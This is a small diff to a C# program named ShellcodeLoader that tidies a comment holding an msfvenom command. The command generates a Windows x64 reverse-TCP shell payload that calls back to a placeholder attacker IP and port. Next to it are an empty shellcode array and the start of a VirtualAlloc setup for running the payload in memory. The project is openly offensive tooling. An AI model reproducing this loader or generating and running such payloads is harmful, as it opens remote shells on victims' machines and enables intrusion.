@@ -8,7 +8,7 @@ namespace ShellcodeLoader
         static void Main(string[] args)
         {
             //Insert shellcode here.
-            //msfvenom - p windows / x64 / shell_reverse_tcp LHOST = attackerIP LPORT = attackerPort - f csharp
+            //msfvenom -p windows/x64/shell_reverse_tcp LHOST=attackerIP LPORT=attackerPort -f csharp
             byte[] shellcode = new byte[] { };
 
             //Set up VirtualAlloc.
